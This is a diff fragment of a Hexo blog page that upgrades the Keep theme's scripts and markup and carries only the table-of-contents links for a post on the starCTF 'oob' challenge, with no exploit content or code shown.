class="nav-item nav-level-4"><a class="nav-link" href="#%E6%9C%80%E7%BB%88%E5%88%A9%E7%94%A8-%E4%BC%A0%E7%BB%9F%E6%96%B9%E5%BC%8F"><span class="nav-text">最终利用: 传统方式</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%9C%80%E7%BB%88%E5%88%A9%E7%94%A8-%E9%9D%9E%E4%BC%A0%E7%BB%9F%E6%96%B9%E5%BC%8F"><span class="nav-text">最终利用: 非传统方式</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9C%80%E7%BB%88exp"><span class="nav-text">最终exp</span></a></li></ol></li></ol>
-    </div>
-</div>
-        </aside>
-    
-
-    <div class="image-viewer-container">
-    <img src="">
+    <!-- image mask -->
+    <div class="zoom-in-image-mask">
+    <img class="zoom-in-image">
 </div>
 
 
+    <!-- local search -->
     
         <div class="search-pop-overlay">
     <div class="popup search-popup">
@@ -602,7 +747,7 @@
                        class="search-input"
                 >
             </div>
-            <span class="popup-btn-close">
+            <span class="close-popup-btn">
                 <i class="fas fa-times"></i>
             </span>
         </div>
@@ -616,29 +761,76 @@
 
     
 
+    <!-- tablet toc -->
+    
+        <div class="tablet-post-toc-mask">
+            <div class="tablet-post-toc">
+                <div class="post-toc-wrap border-box">
+    <div class="post-toc border-box">
+        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-text">前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86"><span class="nav-text">基础知识</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#starCTF-oob"><span class="nav-text">starCTF oob</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="nav-text">漏洞分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%B0%8F%E6%80%BB%E7%BB%93"><span class="nav-text">小总结</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90"><span class="nav-text">利用分析</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-%E6%B3%84%E6%BC%8Fmap%E5%9C%B0%E5%9D%80"><span class="nav-text">1. 泄漏map地址</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-%E7%B1%BB%E5%9E%8B%E6%B7%B7%E6%B7%86%E8%8E%B7%E5%8F%96%E4%BB%BB%E6%84%8F%E5%AF%B9%E8%B1%A1%E5%9C%B0%E5%9D%80"><span class="nav-text">2. 类型混淆获取任意对象地址</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3-%E8%AE%B2%E4%BB%BB%E6%84%8F%E5%9C%B0%E5%9D%80%E5%BD%93%E4%BD%9C%E5%AF%B9%E8%B1%A1"><span class="nav-text">3. 讲任意地址当作对象</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#4-%E5%AE%9E%E7%8E%B0%E4%BB%BB%E6%84%8F%E5%9C%B0%E5%9D%80%E8%AF%BB%E5%8F%96"><span class="nav-text">4. 实现任意地址读取</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#5-%E5%AE%9E%E7%8E%B0%E4%BB%BB%E6%84%8F%E5%9C%B0%E5%9D%80%E5%86%99"><span class="nav-text">5. 实现任意地址写</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%9C%80%E7%BB%88%E5%88%A9%E7%94%A8-%E4%BC%A0%E7%BB%9F%E6%96%B9%E5%BC%8F"><span class="nav-text">最终利用: 传统方式</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%9C%80%E7%BB%88%E5%88%A9%E7%94%A8-%E9%9D%9E%E4%BC%A0%E7%BB%9F%E6%96%B9%E5%BC%8F"><span class="nav-text">最终利用: 非传统方式</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9C%80%E7%BB%88exp"><span class="nav-text">最终exp</span></a></li></ol></li></ol>
+    </div>
+</div>
+
+            </div>
+        </div>
+    
 </main>
 
 
 
-<script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.3/source/js/utils.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.3/source/js/main.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.3/source/js/header-shrink.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.3/source/js/back2top.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.3/source/js/dark-light-toggle.js"></script>
 
 
-    <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.3/source/js/local-search.js"></script>
+<!-- common js -->
+<script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.2.2/js/utils.min.js"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.2.2/js/header-shrink.min.js"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.2.2/js/back2top.min.js"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.2.2/js/toggle-theme.min.js"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.2.2/js/code-block.min.js"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.2.2/js/main.min.js"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.2.2/js/libs/anime.min.js"></script>
+
+<!-- local search -->
+
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.2.2/js/local-search.min.js"></script>
 
 
+<!-- lazyload -->
 
-    <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.3/source/js/code-copy.js"></script>
-
-
-
-    <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.3/source/js/lazyload.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.2.2/js/lazyload.min.js"></script>
 
 
-<div class="post-scripts">
+<div class="">
+    <!-- home page -->
     
-        <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.3/source/js/left-side-toggle.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.3/source/js/libs/anime.min.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.3/source/js/toc.js"></script>
+
+    <!-- post page -->
+    
+        <!-- post-helper -->
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.2.2/js/post/post-helper.min.js"></script>
+
+        <!-- toc -->
+        
+            <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.2.2/js/post/toc.min.js"></script>
+        
+
+        <!-- copyright-info -->
+        
+
+        <!-- share -->
+        
+    
+
+    <!-- categories page -->
+    
+
+    <!-- links page -->
+    
+
+    <!-- photos page -->
+    
+
+    <!-- tools page -->
     
 </div>
+
+<!-- mermaid -->
+
+
+<!-- pjax -->
 
 
 
